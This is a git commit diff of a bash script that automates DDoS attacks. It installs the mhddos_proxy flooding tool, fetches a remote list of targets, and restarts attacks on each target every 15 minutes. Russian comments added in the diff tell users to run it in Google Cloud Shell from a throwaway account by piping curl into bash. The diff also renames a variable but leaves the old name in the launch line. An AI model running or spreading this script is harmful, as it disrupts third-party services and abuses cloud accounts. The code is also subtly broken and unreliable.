2b5e62c6fc404312c9a636c4770e596a390cf392
Genesis-UA <64205209+Genesis-UA@users.noreply.github.com>
2022-04-02 14:33:22 +0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,11 +1,15 @@
 #!/bin/bash
+# 1. В любом браузере заходим в гугл аккаунт (настоятельно рекомендуется создать новый аккаунт и не использовать свой основной).
+# 2. Заходим по ссылке в Google Cloud Shell: https://shell.cloud.google.com/
+# 3. В командной строке терминала вводим команду: curl -s https://raw.githubusercontent.com/Genesis-UA/runner/main/run.sh | bash
+
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
 threads="${1:-1000}"; threads="-t $threads"
 rpc="--rpc 1000"
-proxy_upd="-p 3600"
+proxy_timer_update="-p 3600"
 debug="--debug"
 
 # Restart attacks and update targets every 15 minutes
@@ -24,7 +28,7 @@ do
    for (( i=1; i<=list_size; i++ ))
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
-            echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
+            echo -e $i": " $cmd_line $threads $rpc $proxy_timer_update "--debug\n"
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $proxy_upd $debug&
       done
 sleep 15m
